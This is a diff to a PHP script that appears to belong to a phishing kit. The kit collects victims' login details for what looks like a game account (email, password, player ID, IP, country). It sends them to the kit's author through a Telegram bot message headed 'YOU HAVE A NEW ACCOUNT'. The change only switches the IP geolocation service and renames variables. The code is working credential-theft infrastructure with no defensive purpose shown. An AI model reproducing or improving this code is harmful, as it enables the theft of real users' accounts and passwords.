@@ -52,12 +52,13 @@ $jsondata = json_decode($ipp);
 
 $ipp = $jsondata->query;
 
-$code= file_get_contents("http://api.ipstack.com/".$ipp."?access_key=".$api_key."&format=1");
-
-$jsondata = json_decode($code);
+$pp= file_get_contents("https://ipapi.co/json");
 
 
-$code= $jsondata->calling_code;
+$jsondata = json_decode($pp);
+
+
+$pp= $jsondata->country_calling_code;
     
     
 
@@ -71,12 +72,12 @@ bot("sendMessage",[
 
 ╭────•𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙰 𝙽𝙴𝚆 𝙰𝙲𝙲𝙾𝚄𝙽𝚃•────╮
    ➥ 𝙻𝙾𝙶𝙸𝙽 𝙱𝚈  »  $login
-   💻 • 𝚒𝙿 » `$ipp`
+   💻 • 𝚒𝙿 » $ip
    📧 • 𝙴𝚖𝚊𝚒𝚕 »  `$email`
    📟 • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » `$password`
    💎 • 𝙿𝚕𝚊𝚢𝚎𝚛 𝙸𝙳 » $playid
    🏴 • 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 » $cty
-   ☎️ • 𝙲𝚘𝚍𝚎 » `$code`
+   ☎️ • 𝙲𝚘𝚍𝚎 » `$pp`
    ⏲️ • 𝚃𝚒𝚖𝚎 » $time
    📝 • 𝙳𝚊𝚝𝚎 » $day/$month/$year
 ╰─────•𝙳𝙴𝚅 𝙱𝚈 @PHP505•──────╯
